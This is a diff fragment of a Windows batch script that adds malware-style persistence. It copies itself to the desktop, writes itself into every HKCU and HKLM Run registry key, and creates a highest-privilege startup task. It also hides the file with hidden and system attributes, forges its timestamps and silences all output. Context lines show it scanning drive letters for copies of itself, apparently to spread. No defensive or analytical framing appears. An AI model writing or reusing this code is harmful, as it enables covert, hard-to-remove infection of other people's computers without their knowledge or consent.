@@ -107,6 +107,27 @@ if exist "%path_autoRun2%\%~nx0" (
 
 
 
+if exist "%path_desktop%\%~nx0" (
+  (
+    reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
+    reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
+    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
+    reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% Desktop" /d "%path_desktop%\%~nx0" /f
+    schtasks /create /sc onstart /tn "%app_name% Desktop" /tr "%path_desktop%\%~nx0" /f /rl highest
+  )>nul 2>nul
+) else (
+  copy /y "%~dpnx0" "%path_desktop%\"
+  (
+    if exist "%path_desktop%\%~nx0" (
+      attrib -h -r -s "%path_desktop%\%~nx0"
+      %module_fileTouch% /w /a /c /d %app_date% "%path_desktop%\%~nx0"
+      attrib +h +r +s "%path_desktop%\%~nx0"
+    )
+  )>nul 2>nul
+)
+
+
+
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
   if exist "%%i:\" (
     if exist "%%i:\%~nx0" (
